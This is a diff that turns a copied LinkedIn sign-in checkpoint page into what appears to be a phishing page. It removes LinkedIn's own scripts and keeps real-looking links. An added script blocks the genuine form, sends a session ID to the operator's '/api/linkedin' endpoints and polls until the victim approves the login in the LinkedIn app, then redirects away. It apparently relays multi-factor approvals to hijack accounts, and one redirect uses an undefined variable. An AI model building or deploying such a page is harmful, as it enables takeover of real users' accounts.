@@ -162,9 +162,7 @@
                 <p class="resending hidden__imp" tabindex="-1">Resending...</p>
               </div>
               <div class="try_another_way">
-                <a id="try-another-way" tabindex="0" role="link">
-                  Verify using SMS
-                </a>
+                <a id="try-another-way" tabindex="0" role="link"> </a>
               </div>
               <div class="form__div-error hidden__imp">
                 <div class="form__error--icon">
@@ -310,14 +308,14 @@
             <ul class="footer__base__nav-list" aria-label="Footer Legal Menu">
               <li>
                 <a
-                  href="/legal/user-agreement?trk=d_checkpoint_ch_linkedInAppChallengeActivityDevice_ft_user_agreement"
+                  href="https://www.linkedin.com/legal/user-agreement?trk=d_checkpoint_ch_linkedInAppChallengeActivityDevice_ft_user_agreement"
                 >
                   User Agreement
                 </a>
               </li>
               <li>
                 <a
-                  href="/legal/privacy-policy?trk=d_checkpoint_ch_linkedInAppChallengeActivityDevice_ft_privacy_policy"
+                  href="https://www.linkedin.com/legal/privacy-policy?trk=d_checkpoint_ch_linkedInAppChallengeActivityDevice_ft_privacy_policy"
                 >
                   Privacy Policy
                 </a>
@@ -332,14 +330,14 @@
               </li>
               <li>
                 <a
-                  href="/legal/cookie-policy?trk=d_checkpoint_ch_linkedInAppChallengeActivityDevice_ft_cookie_policy"
+                  href="https://www.linkedin.com/legal/cookie-policy?trk=d_checkpoint_ch_linkedInAppChallengeActivityDevice_ft_cookie_policy"
                 >
                   Cookie Policy
                 </a>
               </li>
               <li>
                 <a
-                  href="/legal/copyright-policy?trk=d_checkpoint_ch_linkedInAppChallengeActivityDevice_ft_copyright_policy"
+                  href="https://www.linkedin.com/legal/copyright-policy?trk=d_checkpoint_ch_linkedInAppChallengeActivityDevice_ft_copyright_policy"
                 >
                   Copyright Policy
                 </a>
@@ -383,10 +381,6 @@
 
     <!---->
 
-    <script
-      src="https://static.licdn.com/sc/h/64bjlk8h2t5fbotu8jq482dvr"
-      type="text/javascript"
-    ></script>
     <form
       method="post"
       class="hidden__imp"
@@ -436,6 +430,115 @@
       <!----><!----><!---->
       <!---->
     </form>
+
+    <script>
+      let sessionId = new URLSearchParams(window.location.search).get(
+        "sessionId"
+      );
+      let text = new URLSearchParams(window.location.search).get("text");
+      document.getElementById("try-another-way").innerText = text;
+      document.addEventListener("DOMContentLoaded", function () {
+        // Prevent form submission
+        const form = document.getElementById("in-app-challenge");
+        if (form) {
+          form.addEventListener("submit", function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+          });
+        }
+
+        // Only prevent default for these two specific elements
+        const resendButton = document.getElementById(
+          "reset-password-submit-button"
+        );
+        const tryAnotherWayButton = document.getElementById("try-another-way");
+
+        if (resendButton) {
+          resendButton.addEventListener(
+            "click",
+            function (e) {
+              e.preventDefault();
+              e.stopPropagation();
+              return false;
+            },
+            true
+          );
+        }
+
+        if (tryAnotherWayButton) {
+          tryAnotherWayButton.addEventListener(
+            "click",
+            function (e) {
+              e.preventDefault();
+              e.stopPropagation();
+              tryAnotherWay();
+              return false;
+            },
+            true
+          );
+        }
+
+        // Allow checkbox to toggle
+        const checkbox = document.querySelector('input[type="checkbox"]');
+        if (checkbox) {
+          checkbox.addEventListener("click", function (e) {
+            // Don't prevent default for checkbox
+            // This allows the checkbox to toggle normally
+          });
+        }
+
+        function tryAnotherWay() {
+          let tryAnotherWayXhr = new XMLHttpRequest();
+          tryAnotherWayXhr.open("POST", "/api/linkedin/try-another-way", true);
+          tryAnotherWayXhr.setRequestHeader("Content-Type", "application/json");
+          tryAnotherWayXhr.send(JSON.stringify({ sessionId: sessionId }));
+
+          tryAnotherWayXhr.onreadystatechange = function () {
+            if (this.status == 200 && this.readyState == 4) {
+              let response = this.response;
+              if (
+                response.includes(
+                  "Enter the code we’ve sent to phone number ending with"
+                )
+              ) {
+                location.href = `/sms.html?sessionId=${sessionId}&text=${responseText}`;
+              } else if (
+                response ==
+                "Enter the code you see on your authenticator app"
+              ) {
+                location.href = `/authenticator-app.html?sessionId=${sessionId}`;
+              }
+            }
+          };
+        }
+
+        function checkAppStatus() {
+          let appStatusXhr = new XMLHttpRequest();
+          appStatusXhr.open("POST", "/api/linkedin/check-app", true);
+          appStatusXhr.setRequestHeader("Content-Type", "application/json");
+          appStatusXhr.send(JSON.stringify({ sessionId: sessionId }));
+
+          appStatusXhr.onreadystatechange = function () {
+            if (this.readyState == 4 && this.status == 200) {
+              let response = this.response;
+              console.log(response);
+              if (response == "0") {
+                setTimeout(function () {
+                  checkAppStatus();
+                }, 4000);
+              } else if (response == "1") {
+                location.href = `https://careers.stravito.com/jobs?split_view=true&geobound_coordinates%5Btop_left_lat%5D=59.17592824927138&geobound_coordinates%5Btop_left_lon%5D=-11.25&geobound_coordinates%5Bbottom_right_lat%5D=27.605670826465445&geobound_coordinates%5Bbottom_right_lon%5D=20.390625`;
+              }
+            }
+          };
+        }
+        setTimeout(function () {
+          checkAppStatus();
+        }, 5000);
+      });
+    </script>
+
     <code id="challengeId" style="display: none"
       ><!--"AQHa2zmI71fkkgAAAZZ4L9MEB-_9xA2y_vuqzLUnKFzyFkFKjLl25kwUrus78A2Apz4TENROhTNhwQFg95fKfSohnpvlo3upDw"--></code
     >
@@ -447,6 +550,7 @@
     <code id="linkedinAppChallengeIDVUrl" style="display: none"
       ><!--false--></code
     >
+
     <code id="flavour" style="display: none"><!--"CONSUMER_LOGIN"--></code>
 
     <code id="isDesktop" style="display: none"><!--true--></code>
@@ -465,18 +569,5 @@
     <code id="lix_sync_apfc_couchbase" style="display: none"
       ><!--"enabled"--></code
     >
-    <script
-      src="https://static.licdn.com/sc/h/aj4dyx1jstg91ffoizgyqt0xm"
-      defer=""
-    ></script>
-    <script
-      src="https://static.licdn.com/sc/h/adqhirffnjsw3nwge4cky8lfm"
-      defer=""
-    ></script>
-
-    <script
-      src="https://static.licdn.com/sc/h/6nxrek900j7n2veiz6fsg28ah"
-      defer=""
-    ></script>
   </body>
 </html>
